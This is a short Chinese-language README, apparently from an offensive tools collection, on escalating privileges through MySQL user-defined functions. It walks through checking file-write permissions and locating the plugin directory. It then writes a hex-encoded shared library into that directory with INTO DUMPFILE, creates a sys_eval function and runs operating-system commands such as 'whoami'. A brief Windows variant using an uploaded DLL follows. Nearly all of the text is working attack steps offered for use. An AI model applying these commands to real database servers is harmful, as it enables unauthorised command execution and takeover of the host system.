# MySQL UDF 提权

> 尝试UDF提权之前，先确保MySQL有读写文件的权限

```SQL
SHOW VARIABLES LIKE 'sec%';
# or
SHOW VARIABLES LIKE 'secure_file_priv';
```
如果查询到 secure_file_priv 的值为NULL，则不可以读写文件

### Linux

> https://github.com/mysqludf/lib_mysqludf_sys

udf.so.txt 是自己的编译的

udf2.so.txt 来自网友编译

> 使用方法

首先通过SQL语句查询到MySQL的plugin位置，如：/usr/lib64/mysql/plugin/

```SQL
SHOW VARIABLES LIKE '%plugin%';
#或者
SELECT @@plugin_dir;
```

然后写UDF到插件目录、创建函数、执行命令

```SQL

SELECT unhex(' [udf.so.txt]|[udf2.so.txt] ') INTO DUMPFILE "/usr/lib64/mysql/plugin/udf.so"; #写入udf.so

DROP FUNCTION sys_eval; # 如果存在函数先drop掉

CREATE FUNCTION sys_eval RETURNS string SONAME 'udf.so'; # 创建函数

SELECT sys_eval ('whoami'); # 执行命令

```


### Windows

方法与上面类似，可以使用tools的UDF提权脚本，或者上传dll文件，命令执行函数名为 shell

